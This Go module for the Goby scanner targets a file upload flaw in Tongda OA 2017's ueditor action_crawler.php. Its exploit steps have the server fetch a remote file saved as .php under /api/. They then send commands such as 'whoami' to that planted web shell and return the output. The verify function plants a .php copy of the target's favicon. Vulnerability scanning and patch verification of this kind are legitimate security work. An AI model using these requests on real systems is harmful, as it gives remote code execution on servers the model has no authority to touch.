package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "TongdaOA action_crawler.php File Upload Vulnerability",
    "Description": "<p>Tongda OA office system is a simple and practical collaborative office OA system developed by Beijing Tongda Xinke Technology Co., Ltd.</p><p>The action_crawler.php file of the Tongda OA2017-v20200417 version has a file upload vulnerability. Attackers can upload malicious files through the vulnerability and gain server permissions.</p>",
    "Product": "TongdaOA",
    "Homepage": "https://www.tongda2000.com/",
    "DisclosureDate": "2022-08-10",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "GobyQuery": "body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "Level": "3",
    "Impact": "<p>The action_crawler.php file of the Tongda OA2017-v20200417 version has a file upload vulnerability. Attackers can upload malicious files through the vulnerability and gain server permissions.</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version of 11.x or 12.x (not fixed in 2017): <a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2. Deploy a web application firewall to monitor file operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "References": [
        "https://www.tongda2000.com/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        },
        {
            "name": "img_url",
            "type": "input",
            "value": "http://xxxx.xxx.xxx/pic/xxx.png",
            "show": ""
        },
        {
            "name": "param",
            "type": "input",
            "value": "img",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/module/ueditor/php/action_crawler.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "CONFIG%5bcatcherPathFormat%5d=/api/upload_crawler&CONFIG%5bcatcherMaxSize%5d=100000&CONFIG%5bcatcherAllowFiles%5d%5b%5d=.php&CONFIG%5bcatcherAllowFiles%5d%5b%5d=.ico&CONFIG%5bcatcherFieldName%5d=file&file[]={{{img_url}}}#.php"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/api/upload_crawler.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "{{{param}}}={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\w\\W]+)"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "TongdaOA action_crawler.php文件上传漏洞",
            "Product": "通达oa",
            "Description": "<p>通达OA办公系统是由<span style=\"color: rgb(62, 62, 62);\">北京通达信科科技有限公司开发的一款<span style=\"color: rgb(62, 62, 62);\">简洁实用的协同办公OA系统。</span></span></p><p><font color=\"#3e3e3e\">通达OA2017-v20200417版本的action_crawler.php文件存在文件上传漏洞，攻击者可以通过漏洞上传恶意文件，获取服务器权限。</font><span style=\"color: rgb(62, 62, 62);\"><span style=\"color: rgb(62, 62, 62);\"><br></span></span></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户升级至11.x或者12.x最新版（2017未修复）：<a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2、部署Web应用防火墙，对文件操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(62, 62, 62);\">通达OA2017-v20200417版本的action_crawler.php</span><span style=\"color: rgb(62, 62, 62); font-size: 16px;\"></span><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">文件存在文件上传漏洞，攻击者可以通过漏洞上传恶意文件，获取服务器权限。</span><br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "TongdaOA action_crawler.php File Upload Vulnerability",
            "Product": "TongdaOA",
            "Description": "<p>Tongda OA office system is a simple and practical collaborative office OA system developed by Beijing Tongda Xinke Technology Co., Ltd.</p><p>The&nbsp;<span style=\"color: rgb(62, 62, 62); font-size: 16px;\">action_crawler.php</span> file of the Tongda OA2017-v20200417 version has a file upload vulnerability. Attackers can upload malicious files through the vulnerability and gain server permissions.<br></p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version of 11.x or 12.x (not fixed in 2017): <a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2. Deploy a web application firewall to monitor file operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Impact": "<p>The <span style=\"color: rgb(62, 62, 62); font-size: 16px;\">action_crawler.php</span> file of the Tongda OA2017-v20200417 version has a file upload vulnerability. Attackers can upload malicious files through the vulnerability and gain server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7308"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/module/ueditor/php/action_crawler.php"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			file_name := "test" + goutils.RandomHexString(10)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = "CONFIG%5bcatcherPathFormat%5d=/api/"+file_name+"&CONFIG%5bcatcherMaxSize%5d=100000&CONFIG%5bcatcherAllowFiles%5d%5b%5d=.php&CONFIG%5bcatcherAllowFiles%5d%5b%5d=.ico&CONFIG%5bcatcherFieldName%5d=file&file[]="+u.FixedHostInfo+"/favicon.ico#.php"
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp1.StatusCode == 200{
				uri := "/api/" + file_name + ".php"
				cfg := httpclient.NewGetRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 {
					return true
				}
			}
			return false
		},
		nil,
	))
}